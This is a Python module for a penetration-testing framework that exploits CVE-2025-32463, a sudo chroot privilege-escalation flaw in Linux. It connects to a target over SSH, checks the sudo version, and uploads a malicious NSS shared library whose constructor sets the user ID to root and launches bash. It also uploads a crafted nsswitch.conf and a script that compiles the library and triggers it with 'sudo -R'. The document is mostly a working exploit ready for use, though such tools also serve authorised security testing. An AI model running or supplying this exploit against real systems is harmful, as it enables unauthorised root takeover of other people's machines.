# /exploits/exp_cve_2025_32463.py
import shutil
import tempfile
import re
import random
import string
from modules.base import BaseModule
from pathlib import Path
from core.utils.formatter import printc
from core.utils.ssh_handler import create_ssh_client, ssh_exec, sftp_upload

class Module(BaseModule):
    def __init__(self):
        super().__init__()

        self.name = "EXP_CVE_2025_32463"
        self.description = "Local Privilege Escalation to Root via Sudo chroot in Linux"
        self.category = "privilege_escalation"
        self.author = "Rich Mirch"
        self.author_email = ""
        self.url = "https://github.com/mirchr/CVE-2025-32463-sudo-chwoot"
        self.license = ""
        self.version = "0.0.1"

        # Default options for the module
        self.default_options = {
            "rhost" : "",
            "rport" : "22",
            "username" : "",
            "password" : "",
        }

        # List of options that are considered required (shown in CLI with 'yes' under Required)
        self.required_options = ["rhost", "rport", "username", "password"]

        self.options = self.default_options.copy()

    def requires(self):
        return []

    def run(self, shared_data):
        # Options
        ssh_host = self.options.get("rhost").strip()
        ssh_port = int(self.options.get("rport"))
        ssh_user = self.options.get("username").strip()
        ssh_password = self.options.get("password").strip()
        remote_dir = "/tmp/" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))


        printc(f"Connecting to {ssh_host}:{ssh_port}...", level="info")
        ssh = create_ssh_client(ssh_host, ssh_port, ssh_user, ssh_password)
        

        if ssh is None:
            printc(f"[!] SSH Connection Failed.", level="warn")
            return

        printc(f"SSH Connection Established.", level="successful")

        try:
            version_str = self.get_sudo_version(ssh)
            if not version_str:
                printc(f"Could not get sudo version from {ssh_host}:{ssh_port}", level="error")
                return
            printc(f"Detected sudo version: {version_str}", level="info")

            if self.is_vulnerable(version_str):
                printc(f"Target is vulnerable to CVE-2025-32463: {version_str}", level="info")
                printc(f"Uploading exploit files to {remote_dir}...", level="info")

                tmp_dir = Path(tempfile.mkdtemp(prefix="2025-32463-"))
                self.exploit(tmp_dir)

                ssh_exec(ssh, f"mkdir -p {remote_dir}/woot/etc {remote_dir}/libnss_")
                sftp_upload(ssh, tmp_dir / "woot1337.c", f"{remote_dir}/woot1337.c")
                sftp_upload(ssh, tmp_dir / "woot/etc/nsswitch.conf", f"{remote_dir}/woot/etc/nsswitch.conf")
                sftp_upload(ssh, tmp_dir / "woot/etc/group", f"{remote_dir}/woot/etc/group")
                sftp_upload(ssh, tmp_dir / "exploit.sh", f"{remote_dir}/exploit.sh")

                printc(f"[✓] Exploit files uploaded to {remote_dir}", level="success")
                printc(f"[>] To execute: ssh {ssh_user}@{ssh_host} 'cd {remote_dir} && bash exploit.sh'", level="warn")

                shutil.rmtree(tmp_dir)
            
            else:
                printc("[✓] Target is NOT vulnerable. Sudo version is patched.", level="success")

        except Exception as e:
            printc(f"Error : {e}", level="error")

        if ssh:
            ssh.close()


    def get_sudo_version(self, ssh):
        _ ,out, _ = ssh_exec(ssh, "sudo -V | head -n 1")
        match = re.search(r"Sudo version (\d+\.\d+\.\d+(?:p\d+)?)", out)
        return match.group(1) if match else None

    def is_vulnerable(self, version_str):
        def parse_version(v):
            parts = re.split(r"[\.p]", v)
            return tuple(map(int, parts + ['0'] * (4 - len(parts))))

        target_version = parse_version(version_str)
        vulnerable_version = parse_version("1.9.17p1")
        return target_version <= vulnerable_version

    def exploit(self, stage: Path):
        ( stage / "woot/etc").mkdir(parents=True, exist_ok=True)
        ( stage / "libnsss_").mkdir(parents=True, exist_ok=True)

        (stage / "woot1337.c").write_text('''
        #include <stdlib.h>
        #include <unistd.h>
        __attribute__((constructor)) void woot(void) {
          setreuid(0,0);
          setregid(0,0);
          chdir("/");
          execl("/bin/bash", "/bin/bash", NULL);
        }
        ''')

        (stage / "woot/etc/nsswitch.conf").write_text("passwd: /woot1337\n")
        shutil.copy("/etc/group", stage / "woot/etc/group")

        (stage / "exploit.sh").write_text('''
        #!/bin/bash
        cd $(dirname "$0")
        gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c
        echo "Launching exploit..."
        sudo -R woot woot
        ''')

